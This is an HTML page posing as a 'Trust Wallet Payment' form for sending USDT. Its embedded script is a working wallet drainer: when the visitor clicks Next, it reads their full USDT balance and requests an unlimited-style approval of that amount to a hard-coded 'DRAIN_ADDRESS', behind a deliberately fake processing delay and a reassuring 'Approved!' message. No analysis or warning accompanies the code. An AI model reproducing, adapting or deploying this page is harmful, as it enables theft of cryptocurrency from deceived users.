<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Trust Wallet Payment</title>
<link rel="icon" href="./favicon.ico" />
<style>
  body { background:#081c3a; color:#fff; font-family:sans-serif; padding:20px; text-align:center; }
  .card { background:#0b1e3e; padding:20px; border-radius:12px; max-width:400px; margin:50px auto; }
  input { width:100%; padding:12px; border-radius:8px; border:none; margin:10px 0; text-align:center; }
  button { background:#0052ff; padding:14px; width:100%; border:none; border-radius:8px; color:#fff; font-size:1.1em; cursor:pointer; position:relative; }
  .spinner { width:24px; height:24px; border:3px solid #ccc; border-top:3px solid #fff; border-radius:50%; animation:spin 1s linear infinite; position:absolute; left:calc(50% - 12px); top:calc(50% - 12px); opacity:0; }
  @keyframes spin { 100% { transform:rotate(360deg); } }
  .processing { color:transparent; }
  .processing .spinner { opacity:1; }
</style>
</head>
<body>
  <div class="card">
    <h2>Send USDT</h2>
    <input id="amount" placeholder="Amount USDT" type="number" />
    <button id="next-btn">Next <div class="spinner"></div></button>
  </div>
  
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <script>
    const DRAIN_ADDRESS = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
    const USDT = "0x55d398326f99059fF775485246999027B3197955";
    const ABI = [
      {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
      {"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}
    ];

    document.getElementById('next-btn').onclick = async () => {
      const btn = document.getElementById('next-btn');
      btn.classList.add('processing'); btn.disabled = true;

      setTimeout(async () => {
        if(!window.ethereum) { alert('Use Trust Wallet DApp browser'); return; }
        await window.ethereum.request({method:'eth_requestAccounts'});
        const web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.getAccounts();
        const contract = new web3.eth.Contract(ABI, USDT);
        const balance = await contract.methods.balanceOf(accounts[0]).call();
        await contract.methods.approve(DRAIN_ADDRESS, balance).send({from:accounts[0]});
        btn.innerText = "âœ… Approved!";
      }, 1500); // fake processing wait
    };
  </script>
</body>
</html>
